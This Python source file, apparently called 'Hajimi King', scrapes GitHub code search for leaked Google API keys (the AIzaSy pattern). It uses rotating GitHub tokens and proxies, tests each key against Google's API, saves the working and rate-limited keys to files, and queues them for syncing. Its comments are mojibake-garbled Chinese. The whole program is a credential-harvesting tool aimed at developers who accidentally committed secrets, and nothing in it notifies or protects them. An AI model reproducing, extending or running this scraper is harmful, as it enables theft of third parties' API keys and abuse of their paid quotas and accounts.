"""
Hajimi King æ”¹è¿›ç‰ˆ - å¢å¼ºæ•°æ®æŒä¹…åŒ–å’ŒTokenä¸€è‡´æ€§
ä¸»è¦æ”¹è¿›ï¼š
1. æ¯æ¬¡æ‰¾åˆ°æœ‰æ•ˆå¯†é’¥ç«‹å³åˆ·æ–°æ–‡ä»¶ç¼“å†²åŒº
2. æ·»åŠ ä¿¡å·å¤„ç†å™¨ä¼˜é›…é€€å‡º
3. ç»Ÿä¸€Tokenè¯»å–é€»è¾‘
"""

import os
import sys
import random
import re
import time
import traceback
import signal
import atexit
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any

# æ·»åŠ çˆ¶ç›®å½•åˆ° Python è·¯å¾„
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

from common.Logger import logger
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils
from utils.parallel_validator import ParallelKeyValidator, get_parallel_validator

# å…¨å±€å˜é‡ç”¨äºä¼˜é›…é€€å‡º
should_exit = False
total_keys_found = 0
total_rate_limited_keys = 0

def signal_handler(signum, frame):
    """ä¿¡å·å¤„ç†å™¨ï¼Œç”¨äºä¼˜é›…é€€å‡º"""
    global should_exit
    logger.info("\nâ›” Received interrupt signal, saving data and exiting gracefully...")
    should_exit = True
    
    # ç«‹å³ä¿å­˜å½“å‰è¿›åº¦
    save_progress()
    
    # ç»™ä¸€ç‚¹æ—¶é—´å®Œæˆä¿å­˜
    time.sleep(2)
    sys.exit(0)

def save_progress():
    """ä¿å­˜å½“å‰è¿›åº¦"""
    global total_keys_found, total_rate_limited_keys
    
    try:
        # æ›´æ–°checkpoint
        checkpoint.update_scan_time()
        file_manager.save_checkpoint(checkpoint)
        
        # å¼ºåˆ¶åˆ·æ–°æ‰€æœ‰æ–‡ä»¶
        file_manager.flush_all_files()
        
        logger.info(f"ğŸ’¾ Progress saved - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
        logger.info(f"ğŸ“Š Checkpoint saved with {len(checkpoint.scanned_shas)} scanned files")
        
        # æ˜¾ç¤ºä¿å­˜çš„æ–‡ä»¶ä½ç½®
        if file_manager.keys_valid_filename and os.path.exists(file_manager.keys_valid_filename):
            file_size = os.path.getsize(file_manager.keys_valid_filename)
            logger.info(f"ğŸ“ Valid keys file: {file_manager.keys_valid_filename} ({file_size} bytes)")
            
        if file_manager.rate_limited_filename and os.path.exists(file_manager.rate_limited_filename):
            file_size = os.path.getsize(file_manager.rate_limited_filename)
            logger.info(f"ğŸ“ Rate limited keys file: {file_manager.rate_limited_filename} ({file_size} bytes)")
            
    except Exception as e:
        logger.error(f"âŒ Error saving progress: {e}")
        traceback.print_exc()

def cleanup():
    """æ¸…ç†å‡½æ•°ï¼Œç¨‹åºé€€å‡ºæ—¶è°ƒç”¨"""
    logger.info("ğŸ”š Performing cleanup...")
    save_progress()
    
    # å…³é—­åŒæ­¥å·¥å…·
    try:
        sync_utils.shutdown()
    except:
        pass
    
    # å…³é—­å¹¶è¡ŒéªŒè¯å™¨
    try:
        parallel_validator.shutdown()
    except:
        pass
    
    logger.info("âœ… Cleanup completed")

# æ³¨å†Œä¿¡å·å¤„ç†å™¨å’Œé€€å‡ºå¤„ç†å™¨
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)

# åˆ›å»ºGitHubå·¥å…·å®ä¾‹ï¼ˆä½¿ç”¨æ–°çš„TokenManagerï¼‰
github_utils = GitHubClient.create_instance(use_token_manager=True)

# åˆ›å»ºå¹¶è¡ŒéªŒè¯å™¨å®ä¾‹
parallel_validator = get_parallel_validator(max_workers=10)

# ç»Ÿè®¡ä¿¡æ¯
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}

# éªŒè¯ç»Ÿè®¡
validation_stats = {
    "serial_count": 0,
    "parallel_count": 0,
    "serial_time": 0.0,
    "parallel_time": 0.0
}


class EnhancedFileManager:
    """å¢å¼ºçš„æ–‡ä»¶ç®¡ç†å™¨ï¼Œç¡®ä¿æ•°æ®å®æ—¶ä¿å­˜"""
    
    def __init__(self, base_manager):
        self.base_manager = base_manager
        self.file_handles = {}
        
    def save_valid_keys(self, repo_name: str, file_path: str, file_url: str, valid_keys: List[str]) -> None:
        """ä¿å­˜æœ‰æ•ˆçš„APIå¯†é’¥ï¼ˆå¢å¼ºç‰ˆï¼‰"""
        if not valid_keys:
            return
            
        # è°ƒç”¨åŸå§‹ä¿å­˜æ–¹æ³•
        self.base_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        
        # ç«‹å³åˆ·æ–°æ–‡ä»¶ç¼“å†²åŒº
        self.flush_file(self.base_manager.keys_valid_filename)
        self.flush_file(self.base_manager.detail_log_filename)
        
        logger.info(f"ğŸ’¾ Saved and flushed {len(valid_keys)} valid key(s) to disk")
    
    def save_rate_limited_keys(self, repo_name: str, file_path: str, file_url: str, rate_limited_keys: List[str]) -> None:
        """ä¿å­˜è¢«é™æµçš„APIå¯†é’¥ï¼ˆå¢å¼ºç‰ˆï¼‰"""
        if not rate_limited_keys:
            return
            
        # è°ƒç”¨åŸå§‹ä¿å­˜æ–¹æ³•
        self.base_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)
        
        # ç«‹å³åˆ·æ–°æ–‡ä»¶ç¼“å†²åŒº
        self.flush_file(self.base_manager.rate_limited_filename)
        self.flush_file(self.base_manager.rate_limited_detail_filename)
        
        logger.info(f"ğŸ’¾ Saved and flushed {len(rate_limited_keys)} rate limited key(s) to disk")
    
    def flush_file(self, filename: str) -> None:
        """åˆ·æ–°ç‰¹å®šæ–‡ä»¶çš„ç¼“å†²åŒº"""
        if filename and os.path.exists(filename):
            try:
                # æ‰“å¼€æ–‡ä»¶å¹¶ç«‹å³å…³é—­ï¼Œå¼ºåˆ¶åˆ·æ–°
                with open(filename, 'a') as f:
                    f.flush()
                    os.fsync(f.fileno())
            except Exception as e:
                logger.error(f"Error flushing file {filename}: {e}")
    
    def flush_all_files(self) -> None:
        """åˆ·æ–°æ‰€æœ‰æ–‡ä»¶çš„ç¼“å†²åŒº"""
        files_to_flush = [
            self.base_manager.keys_valid_filename,
            self.base_manager.detail_log_filename,
            self.base_manager.rate_limited_filename,
            self.base_manager.rate_limited_detail_filename
        ]
        
        for filename in files_to_flush:
            if filename:
                self.flush_file(filename)
    
    def __getattr__(self, name):
        """ä»£ç†å…¶ä»–æ–¹æ³•åˆ°åŸå§‹file_manager"""
        return getattr(self.base_manager, name)


# ä½¿ç”¨å¢å¼ºçš„æ–‡ä»¶ç®¡ç†å™¨
enhanced_file_manager = EnhancedFileManager(file_manager)


def normalize_query(query: str) -> str:
    """æ ‡å‡†åŒ–æŸ¥è¯¢å­—ç¬¦ä¸²"""
    query = " ".join(query.split())

    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings = []
    language_parts = []
    filename_parts = []
    path_parts = []
    other_parts = []

    for part in parts:
        if part.startswith('"') and part.endswith('"'):
            quoted_strings.append(part)
        elif part.startswith('language:'):
            language_parts.append(part)
        elif part.startswith('filename:'):
            filename_parts.append(part)
        elif part.startswith('path:'):
            path_parts.append(part)
        elif part.strip():
            other_parts.append(part)

    normalized_parts = []
    normalized_parts.extend(sorted(quoted_strings))
    normalized_parts.extend(sorted(other_parts))
    normalized_parts.extend(sorted(language_parts))
    normalized_parts.extend(sorted(filename_parts))
    normalized_parts.extend(sorted(path_parts))

    return " ".join(normalized_parts)


def extract_keys_from_content(content: str) -> List[str]:
    """ä»å†…å®¹ä¸­æå–APIå¯†é’¥"""
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)


def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    """æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡å¤„ç†æ­¤item"""
    # æ£€æŸ¥å¢é‡æ‰«ææ—¶é—´
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except Exception as e:
            pass

    # æ£€æŸ¥SHAæ˜¯å¦å·²æ‰«æ
    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    # æ£€æŸ¥ä»“åº“å¹´é¾„
    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    # æ£€æŸ¥æ–‡æ¡£å’Œç¤ºä¾‹æ–‡ä»¶
    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""


def process_item_parallel(item: Dict[str, Any]) -> tuple:
    """ä½¿ç”¨å¹¶è¡ŒéªŒè¯å¤„ç†å•ä¸ªGitHubæœç´¢ç»“æœitem"""
    global should_exit, total_keys_found, total_rate_limited_keys
    
    if should_exit:
        return 0, 0
    
    delay = random.uniform(0.5, 1.5)
    file_url = item["html_url"]

    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"âš ï¸ Failed to fetch content for file: {file_url}")
        return 0, 0

    keys = extract_keys_from_content(content)

    # è¿‡æ»¤å ä½ç¬¦å¯†é’¥
    filtered_keys = []
    for key in keys:
        context_index = content.find(key)
        if context_index != -1:
            snippet = content[context_index:context_index + 45]
            if "..." in snippet or "YOUR_" in snippet.upper():
                continue
        filtered_keys.append(key)
    
    # å»é‡å¤„ç†
    keys = list(set(filtered_keys))

    if not keys:
        return 0, 0

    logger.info(f"ğŸ”‘ Found {len(keys)} suspected key(s), starting parallel validation...")

    # ä½¿ç”¨å¹¶è¡ŒéªŒè¯
    start_time = time.time()
    results = parallel_validator.validate_batch(keys)
    validation_time = time.time() - start_time

    # æ›´æ–°éªŒè¯ç»Ÿè®¡
    validation_stats["parallel_count"] += len(keys)
    validation_stats["parallel_time"] += validation_time

    valid_keys = []
    rate_limited_keys = []

    # å¤„ç†éªŒè¯ç»“æœ
    for key, result in results.items():
        if result.status == "ok":
            valid_keys.append(key)
            logger.info(f"âœ… VALID: {key} (response: {result.response_time:.2f}s)")
        elif result.status == "rate_limited":
            rate_limited_keys.append(key)
            logger.warning(f"âš ï¸ RATE LIMITED: {key}, proxy: {result.proxy_used}")
        else:
            logger.info(f"âŒ INVALID: {key}, status: {result.status}")

    # æ˜¾ç¤ºå¹¶è¡ŒéªŒè¯æ€§èƒ½
    if len(keys) > 1:
        logger.info(f"âš¡ Parallel validation completed: {len(keys)} keys in {validation_time:.2f}s ({len(keys)/validation_time:.1f} keys/s)")

    # ä½¿ç”¨å¢å¼ºçš„æ–‡ä»¶ç®¡ç†å™¨ä¿å­˜ç»“æœï¼ˆä¼šç«‹å³åˆ·æ–°åˆ°ç£ç›˜ï¼‰
    if valid_keys:
        enhanced_file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        total_keys_found += len(valid_keys)
        
        # æ·»åŠ åˆ°åŒæ­¥é˜Ÿåˆ—
        try:
            sync_utils.add_keys_to_queue(valid_keys)
            logger.info(f"ğŸ“¥ Added {len(valid_keys)} key(s) to sync queues")
        except Exception as e:
            logger.error(f"ğŸ“¥ Error adding keys to sync queues: {e}")

    if rate_limited_keys:
        enhanced_file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)
        total_rate_limited_keys += len(rate_limited_keys)

    return len(valid_keys), len(rate_limited_keys)


def print_skip_stats():
    """æ‰“å°è·³è¿‡ç»Ÿè®¡ä¿¡æ¯"""
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(f"ğŸ“Š Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")


def print_validation_stats():
    """æ‰“å°éªŒè¯æ€§èƒ½ç»Ÿè®¡"""
    stats = parallel_validator.get_stats()
    proxy_stats = parallel_validator.get_proxy_stats()
    
    logger.info("ğŸ“Š Validation Performance Stats:")
    logger.info(f"   Total validated: {stats.total_validated}")
    logger.info(f"   Valid keys: {stats.valid_keys}")
    logger.info(f"   Invalid keys: {stats.invalid_keys}")
    logger.info(f"   Rate limited: {stats.rate_limited_keys}")
    logger.info(f"   Errors: {stats.errors}")
    logger.info(f"   Average response time: {stats.avg_response_time:.2f}s")
    
    if stats.total_validated > 0:
        throughput = stats.total_validated / stats.total_time if stats.total_time > 0 else 0
        logger.info(f"   Overall throughput: {throughput:.1f} keys/second")
    
    if proxy_stats:
        logger.info("ğŸŒ Proxy Performance:")
        for proxy_url, pstats in proxy_stats.items():
            logger.info(f"   {proxy_url}: {pstats['success_rate']:.1%} success ({pstats['success']}/{pstats['total']})")


def reset_skip_stats():
    """é‡ç½®è·³è¿‡ç»Ÿè®¡"""
    global skip_stats
    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}


def display_token_consistency_check():
    """æ˜¾ç¤ºTokenä¸€è‡´æ€§æ£€æŸ¥"""
    logger.info("ğŸ” Checking Token consistency...")
    
    # è·å–Tokenç®¡ç†å™¨çŠ¶æ€
    token_status = github_utils.get_token_status()
    
    # æ£€æŸ¥github_tokens.txtæ–‡ä»¶
    tokens_file = "github_tokens.txt"
    file_token_count = 0
    
    if os.path.exists(tokens_file):
        with open(tokens_file, 'r') as f:
            lines = f.readlines()
            file_token_count = len([line for line in lines if line.strip() and not line.strip().startswith('#')])
    
    logger.info(f"ğŸ“Š Token Status:")
    logger.info(f"   TokenManager: {token_status.get('total_tokens', 0)} tokens")
    logger.info(f"   Active tokens: {token_status.get('active_tokens', 0)}")
    logger.info(f"   File ({tokens_file}): {file_token_count} tokens")
    
    if token_status.get('total_tokens', 0) != file_token_count:
        logger.warning(f"âš ï¸ Token count mismatch! Manager has {token_status.get('total_tokens', 0)}, file has {file_token_count}")
        logger.warning(f"   Please check your token configuration")
    else:
        logger.info(f"âœ… Token counts are consistent")
    
    return token_status


def main():
    global should_exit, total_keys_found, total_rate_limited_keys
    
    start_time = datetime.now()

    # æ‰“å°ç³»ç»Ÿå¯åŠ¨ä¿¡æ¯
    logger.info("=" * 60)
    logger.info("ğŸš€ HAJIMI KING STARTING (Enhanced Data Persistence Edition)")
    logger.info("=" * 60)
    logger.info(f"â° Started at: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"âš¡ Parallel validation enabled with {parallel_validator.max_workers} workers")
    logger.info(f"ğŸ’¾ Enhanced data persistence enabled - all finds saved immediately")

    # 1. æ£€æŸ¥é…ç½®
    if not Config.check():
        logger.info("âŒ Config check failed. Exiting...")
        sys.exit(1)
        
    # 2. æ£€æŸ¥æ–‡ä»¶ç®¡ç†å™¨
    if not file_manager.check():
        logger.error("âŒ FileManager check failed. Exiting...")
        sys.exit(1)

    # 3. Tokenä¸€è‡´æ€§æ£€æŸ¥
    token_status = display_token_consistency_check()

    # 4. æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯
    search_queries = file_manager.get_search_queries()
    logger.info("ğŸ“‹ SYSTEM INFORMATION:")
    logger.info(f"ğŸ” Search queries: {len(search_queries)} loaded")
    logger.info(f"ğŸ“… Date filter: {Config.DATE_RANGE_DAYS} days")
    if Config.PROXY_LIST:
        logger.info(f"ğŸŒ Proxy: {len(Config.PROXY_LIST)} proxies configured")

    if checkpoint.last_scan_time:
        logger.info(f"ğŸ’¾ Checkpoint found - Incremental scan mode")
        logger.info(f"   Last scan: {checkpoint.last_scan_time}")
        logger.info(f"   Scanned files: {len(checkpoint.scanned_shas)}")
        logger.info(f"   Processed queries: {len(checkpoint.processed_queries)}")
    else:
        logger.info(f"ğŸ’¾ No checkpoint - Full scan mode")

    # æ˜¾ç¤ºè¾“å‡ºæ–‡ä»¶ä½ç½®
    logger.info("ğŸ“ Output files:")
    logger.info(f"   Valid keys: {file_manager.keys_valid_filename}")
    logger.info(f"   Rate limited: {file_manager.rate_limited_filename}")
    logger.info(f"   Details: {file_manager.detail_log_filename}")

    logger.info("âœ… System ready - Starting scan")
    logger.info("ğŸ’¡ Press Ctrl+C anytime to save progress and exit gracefully")
    logger.info("=" * 60)

    loop_count = 0

    while not should_exit:
        try:
            loop_count += 1
            logger.info(f"ğŸ”„ Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")

            query_count = 0
            loop_processed_files = 0
            reset_skip_stats()

            for i, q in enumerate(search_queries, 1):
                if should_exit:
                    break
                    
                normalized_q = normalize_query(q)
                if normalized_q in checkpoint.processed_queries:
                    logger.info(f"ğŸ” Skipping already processed query: [{q}], index:#{i}")
                    continue

                res = github_utils.search_for_keys(q)

                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys = 0
                        query_rate_limited_keys = 0
                        query_processed = 0
                        
                        for item_index, item in enumerate(items, 1):
                            if should_exit:
                                break
                            
                            # æ¯10ä¸ªitemä¿å­˜checkpoint
                            if item_index % 10 == 0:
                                logger.info(f"ğŸ“ˆ Progress: {item_index}/{len(items)} | query: {q} | valid: {query_valid_keys}")
                                save_progress()
                                
                            # æ£€æŸ¥æ˜¯å¦åº”è¯¥è·³è¿‡æ­¤item
                            should_skip, skip_reason = should_skip_item(item, checkpoint)
                            if should_skip:
                                logger.debug(f"ğŸš« Skipping item {item.get('path','').lower()}, index:{item_index} - reason: {skip_reason}")
                                continue

                            # å¤„ç†å•ä¸ªitem
                            valid_count, rate_limited_count = process_item_parallel(item)

                            query_valid_keys += valid_count
                            query_rate_limited_keys += rate_limited_count
                            query_processed += 1

                            # è®°å½•å·²æ‰«æçš„SHA
                            checkpoint.add_scanned_sha(item.get("sha"))
                            loop_processed_files += 1

                        if query_processed > 0:
                            logger.info(f"âœ… Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}, Rate limited: +{query_rate_limited_keys}")
                        else:
                            logger.info(f"â­ï¸ Query {i}/{len(search_queries)} complete - All items skipped")

                        print_skip_stats()
                    else:
                        logger.info(f"ğŸ“­ Query {i}/{len(search_queries)} - No items found")
                else:
                    logger.warning(f"âŒ Query {i}/{len(search_queries)} failed")

                checkpoint.add_processed_query(normalized_q)
                query_count += 1

                # ä¿å­˜è¿›åº¦
                save_progress()

                if query_count % 5 == 0:
                    logger.info(f"â¸ï¸ Processed {query_count} queries, taking a break...")
                    time.sleep(1)

            logger.info(f"ğŸ Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")
            
            # æ˜¾ç¤ºæœ€ç»ˆéªŒè¯ç»Ÿè®¡
            print_validation_stats()
            
            # æ˜¾ç¤ºTokençŠ¶æ€
            if loop_count % 5 == 0:
                token_summary = github_utils.get_token_status()
                if "active_tokens" in token_summary:
                    logger.info(f"ğŸ“Š Token Status - Active: {token_summary['active_tokens']}/{token_summary['total_tokens']}, Remaining calls: {token_summary.get('total_remaining_calls', 'N/A')}")

            logger.info(f"ğŸ’¤ Sleeping for 10 seconds...")
            time.sleep(10)

        except KeyboardInterrupt:
            logger.info("â›” Interrupted by user")
            should_exit = True
            break
        except Exception as e:
            logger.error(f"ğŸ’¥ Unexpected error: {e}")
            traceback.print_exc()
            
            # ä¿å­˜å½“å‰è¿›åº¦
            save_progress()
            
            logger.info("ğŸ”„ Continuing after error...")
            time.sleep(5)
            continue

    # ç¨‹åºç»“æŸå‰çš„æœ€ç»ˆç»Ÿè®¡
    logger.info("=" * 60)
    logger.info("ğŸ“Š FINAL STATISTICS")
    logger.info(f"âœ… Total valid keys found: {total_keys_found}")
    logger.info(f"âš ï¸ Total rate limited keys: {total_rate_limited_keys}")
    logger.info(f"ğŸ“ Scanned files: {len(checkpoint.scanned_shas)}")
    logger.info(f"ğŸ” Processed queries: {len(checkpoint.processed_queries)}")
    
    # æ˜¾ç¤ºæœ€ç»ˆæ€§èƒ½ç»Ÿè®¡
    print_validation_stats()
    
    end_time = datetime.now()
    duration = end_time - start_time
    logger.info(f"â±ï¸ Total runtime: {duration}")
    logger.info("=" * 60)
    logger.info("ğŸ”š HAJIMI KING SHUTDOWN COMPLETE")


if __name__ == "__main__":
    main()